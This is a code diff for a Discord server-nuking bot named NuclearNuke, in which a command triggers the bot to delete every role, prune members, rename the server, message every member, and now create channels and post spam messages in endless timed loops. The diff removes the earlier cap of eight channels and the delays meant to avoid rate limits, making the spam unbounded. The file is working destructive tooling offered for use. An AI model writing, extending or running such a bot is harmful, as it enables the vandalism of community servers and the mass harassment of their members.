@@ -15,7 +15,10 @@ Self.configuration = {
     send_message_to_created_channel: "This server is nuked using NuclearNuke from https://github.com/i2rys/ODiscord",
     change_server_name_to: "Nuked using NuclearNuke",
     make_role_called: "Nuked using NuclearNuke",
-    message_every_member: "One of the server your in has been nuked using NuclearNuke from https://github.com/i2rys/ODiscord"
+    message_every_member: "One of the server your in has been nuked using NuclearNuke from https://github.com/i2rys/ODiscord",
+    prune_days: 1,
+    make_channel_spam_milliseconds: 1000,
+    created_channel_message_spam_milliseconds: 2000
 }
 
 //Functions
@@ -70,16 +73,6 @@ Bot.on("message", async(message)=>{
             })
         })
 
-        Self.log("info", "Making 8 channels in the server and messaging them.")
-        for( let i = 0; i <= 7; i++ ){
-            message.guild.channels.create(Self.configuration.make_channel_called).then((channel)=>{
-                channel.send(Self.configuration.send_message_to_created_channel)
-                Self.log("info", `Successfully created a server channel called ${Self.configuration.make_channel_called}`)
-            }).catch(()=>{
-                Self.log("warn", `Unable to create a server channel called ${Self.configuration.make_channel_called}`)
-            })
-        }
-
         Self.log("info", "Removing all roles.")
         message.guild.roles.cache.forEach(role=>{
             role.delete().then(()=>{
@@ -98,11 +91,8 @@ Bot.on("message", async(message)=>{
             })
         }
 
-        Self.log("info", "Idling for 1 seconds to avoid getting limited.")
-        await Delay(1000)
-
         Self.log("info", "Pruning server members.")
-        message.guild.members.prune({ days: 1 }).then(()=>{
+        message.guild.members.prune({ days: Self.configuration.prune_days }).then(()=>{
             Self.log("info", "Successfully pruned server members.")
         }).catch(()=>{
             Self.log("warn", "Unable to prune server members.")
@@ -126,11 +116,22 @@ Bot.on("message", async(message)=>{
             })
         })
 
-        await Delay(3000)
-        Self.log("info", `Finished nuking in the server called ${message.guild.name}.`)
-        Self.log("info", "Cleaning up, please wait for 7 seconds.")
-        await Delay(7000)
-        Self.log("info", "=========================================================== End ===========================================================")
+        await Delay(2000)
+        Self.log("info", "Making infinite channels in the server and messaging them.")
+        setInterval(function(){
+            message.guild.channels.create(Self.configuration.make_channel_called).then((channel)=>{
+                Self.log("info", `Successfully created a server channel called ${Self.configuration.make_channel_called}`)
+                setInterval(function(){
+                    channel.send(Self.configuration.send_message_to_created_channel).then(()=>{
+                        Self.log("info", `Successfully sent a message to a server channel called ${Self.configuration.make_channel_called}`)
+                    }).catch(()=>{
+                        Self.log("warn", `Unable to send a message to a server channel called ${Self.configuration.make_channel_called}`)
+                    })
+                }, Self.configuration.created_channel_message_spam_milliseconds)
+            }).catch(()=>{
+                Self.log("warn", `Unable to create a server channel called ${Self.configuration.make_channel_called}`)
+            })
+        }, Self.configuration.make_channel_spam_milliseconds)
     }
 })
 
